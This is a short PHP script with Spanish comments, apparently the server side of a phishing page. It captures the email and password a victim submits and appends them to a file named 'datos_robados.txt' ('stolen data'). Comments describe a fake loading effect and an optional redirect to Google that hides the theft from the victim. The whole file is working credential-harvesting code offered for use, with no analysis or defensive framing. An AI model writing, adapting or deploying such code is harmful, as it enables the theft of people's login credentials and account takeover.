<?php
// procesar.php

// Si se recibe un POST (cuando el usuario hace clic en "Siguiente" en el HTML)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Guardamos en un archivo de texto (si no usas base de datos)
    $file = fopen("datos_robados.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // IMPORTANTE: NO redirigimos aquí todavía.
    // El HTML solo muestra los datos y espera a que el usuario haga clic en "Confirmar".
    // Redirigimos desde el JavaScript del HTML para dar el efecto de carga.
    
    // Si querés que el PHP redirija *inmediatamente* después de guardar (sin esperar a la tarjeta), 
    // descomentá la línea de abajo:
    // header("Location: https://www.google.com");
    // exit();
}
?>